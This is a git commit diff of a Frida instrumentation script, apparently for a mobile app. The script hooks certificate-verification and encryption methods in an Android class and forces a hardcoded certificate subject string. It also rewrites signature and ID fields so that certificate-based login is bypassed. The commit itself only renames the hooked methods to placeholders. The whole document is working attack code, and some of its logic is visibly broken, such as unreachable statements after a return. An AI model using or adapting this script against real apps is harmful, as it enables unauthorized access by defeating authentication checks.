c198fb2292bcba2698a180fb4ef77360cea7810b
honggu <61570172+hjw1183@users.noreply.github.com>
2024-02-28 16:39:33 +0900

    Update certfication_login_bypass.js

--- certfication_login_bypass.js
+++ certfication_login_bypass.js
@@ -1,11 +1,11 @@
 setImmediate(function(){
 	Java.perform(function(){
 	var certfication_info = Java.use('com.example.ExampleSolution');
-		certfication_info.verifyCertInfo.overload('java.lang.String','java.lang.String').implementation = function(arg1,arg2){
+		certfication_info.ExampleCertInfo.overload('java.lang.String','java.lang.String').implementation = function(arg1,arg2){
 			console.log("[*] certfication info"+arg1+arg2);			
-			return this.verifyCertInfo("cn=ooo()001111111111111111111111,ou=NACF,ou=licensedCA,o=KICA,c=KR","getvidinfo");
+			return this.ExampleCertInfo("cn=ooo()001111111111111111111111,ou=NACF,ou=licensedCA,o=KICA,c=KR","getvidinfo");
 			
-			console.log("[*] test"+verifyCertInfo);
+			console.log("[*] test"+ExampleCertInfo);
 			
 		}
 	})
@@ -15,7 +15,7 @@ setImmediate(function(){
 setImmediate(function(){
 	Java.perform(function(){
 		var certfication_login_bypass = Java.use("com.example.ExampleSolution");
-		certfication_login_bypass.BlockEncEx.implementation = function(a,b,c,d,e){
+		certfication_login_bypass.ExampleCertInfoEncEx.implementation = function(a,b,c,d,e){
 			console.log("[*] Exit Bypass");
 			
 			if(c.indexOf('"sign":""','"vid":""')>=0){
@@ -24,7 +24,7 @@ setImmediate(function(){
 				c=c.replace('"vid":"vid값"');
 			}
 			console.log(c);
-			return this.BlockEncEx(a,b,c,d,e);
+			return this.ExampleCertInfoEncEx(a,b,c,d,e);
 		}
 	})
 })
